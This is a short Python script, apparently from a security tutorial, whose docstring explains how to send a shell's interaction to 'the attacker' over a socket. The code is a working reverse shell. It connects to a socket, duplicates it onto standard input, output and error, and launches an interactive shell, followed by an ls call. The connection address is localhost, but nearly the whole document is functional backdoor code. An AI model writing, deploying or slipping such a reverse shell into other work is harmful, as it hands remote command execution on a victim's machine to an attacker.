#!/usr/bin/python


'''
Once we have obtained the shell, we can obtain a directory listing using the /bin/ls command,
but first, we need to establish the connection to our socket through the command output. We
accomplish this with the os.dup2(sock.fileno ()) instruction as a system call wrapper that
allows a file descriptor to be duplicated so that all the interaction of the /bin/bash program is
sent to the attacker via the socket.

'''




import socket
import subprocess
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 45678))
sock.send(b'[*] Connection Established')
os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)
shell_remote = subprocess.call(["/usr/bin/sh", "-i"])
proc = subprocess.call(["/usr/bin/ls", "-i"])
